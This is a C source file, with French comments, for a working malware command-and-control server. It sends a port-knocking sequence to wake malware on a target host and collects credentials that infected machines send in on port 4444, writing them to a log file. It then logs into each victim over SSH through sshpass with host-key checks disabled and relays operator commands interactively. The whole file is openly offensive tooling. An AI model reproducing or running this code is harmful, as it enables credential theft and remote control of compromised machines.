#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define TARGET_IP "192.168.18.130"
#define KNOCK_PORT_1 1111
#define KNOCK_PORT_2 2222
#define KNOCK_PORT_3 3333
#define C2_PORT 4444
#define BUFFER_SIZE 1024
#define SSH_COMMAND "sshpass -p '%s' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -tt %s@%s"

typedef struct {
    char ip[INET_ADDRSTRLEN];
    char username[BUFFER_SIZE];
    char password[BUFFER_SIZE];
} InfectedHost;

InfectedHost infected_hosts[100];
int infected_count = 0;

// 🔥 Fonction pour envoyer le port knocking
void knock(int port) {
    int sock;
    struct sockaddr_in server_addr;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Erreur socket");
        exit(1);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, TARGET_IP, &server_addr.sin_addr);

    sendto(sock, "knock", strlen("knock"), 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
    printf("[C2] Knock envoyé sur le port %d\n", port);

    close(sock);
}

// 🔥 Envoi des knocks au démarrage du C2
void send_knocks() {
    printf("[C2] 🔓 Envoi initial de la séquence de port knocking...\n");
    knock(KNOCK_PORT_1);
    sleep(1);
    knock(KNOCK_PORT_2);
    sleep(1);
    knock(KNOCK_PORT_3);
    sleep(1);
    printf("[C2] ✅ Knock terminé, le malware doit être activé sur la cible.\n");
}

// 🔥 Fonction pour exécuter des commandes sur la cible via SSH
void execute_ssh_commands(char *ip, char *username, char *password) {
    char command[256];
    printf("\n[C2] 🖥️ Connexion SSH établie avec %s@%s...\n", username, ip);
    
    snprintf(command, sizeof(command), SSH_COMMAND, password, username, ip);
    FILE *fp = popen(command, "w");
    if (fp == NULL) {
        printf("[C2] ❌ Impossible d'exécuter la commande SSH\n");
        return;
    }

    while (1) {
        char cmd[BUFFER_SIZE];
        printf("[C2] Commande à exécuter sur %s@%s : ", username, ip);
        fgets(cmd, sizeof(cmd), stdin);
        cmd[strcspn(cmd, "\n")] = 0;  // Supprime le saut de ligne

        if (strcmp(cmd, "exit") == 0) {
            fprintf(fp, "exit\n");
            break;
        }

        fprintf(fp, "%s\n", cmd);
        fflush(fp);
    }

    pclose(fp);
    printf("[C2] Connexion SSH fermée.\n");
}

// Fonction pour tester la connexion SSH avec les credentials récupérés
void test_ssh_connection(char *ip, char *username, char *password) {
    char command[256];

    printf("\n[C2] Tentative de connexion SSH avec %s@%s...\n", username, ip);
    
    snprintf(command, sizeof(command), SSH_COMMAND, password, username, ip);
    
    int status = system(command);

    if (status == 0) {
        printf("[C2] Connexion SSH réussie avec %s@%s !\n", username, ip);
        execute_ssh_commands(ip, username, password); // Lancer l'exécution de commandes SSH
    } else {
        printf("[C2] Échec de la connexion SSH avec %s@%s\n", username, ip);
    }
}

// Fonction pour stocker les credentials en mémoire et dans un fichier
void save_data(const char *ip, const char *data) {
    FILE *fp = fopen("credentials.log", "a");
    if (fp == NULL) {
        perror("Erreur ouverture fichier");
        return;
    }
    fprintf(fp, "[%s] %s\n", ip, data);
    fclose(fp);

    // Stocker en mémoire et extraire username/password
    if (infected_count < 100) {
        sscanf(data, "[+] Username : %s | Mot de passe : %s", infected_hosts[infected_count].username, infected_hosts[infected_count].password);
        strncpy(infected_hosts[infected_count].ip, ip, INET_ADDRSTRLEN);
        infected_count++;

        // Lancer le test SSH avec l'IP et les credentials récupérés
        test_ssh_connection(ip, infected_hosts[infected_count - 1].username, infected_hosts[infected_count - 1].password);
    }
}

int main() {

    send_knocks();
    int server_fd, new_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_size;
    char buffer[BUFFER_SIZE];

    // Création du socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        perror("Erreur création socket");
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(C2_PORT);

    // Liaison du socket
    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Erreur bind");
        exit(1);
    }

    // Écoute des connexions entrantes
    if (listen(server_fd, 5) < 0) {
        perror("Erreur listen");
        exit(1);
    }

    printf("🔥 Serveur C2 en écoute sur le port %d...\n", C2_PORT);

    while (1) {
        addr_size = sizeof(client_addr);
        new_socket = accept(server_fd, (struct sockaddr*)&client_addr, &addr_size);
        if (new_socket < 0) {
            perror("Erreur accept");
            continue;
        }

        char client_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, INET_ADDRSTRLEN);

        memset(buffer, 0, BUFFER_SIZE);
        read(new_socket, buffer, BUFFER_SIZE);

        printf("[INFO] Credentials reçus de %s : %s\n", client_ip, buffer);
        save_data(client_ip, buffer);

        close(new_socket);
    }

    return 0;
}
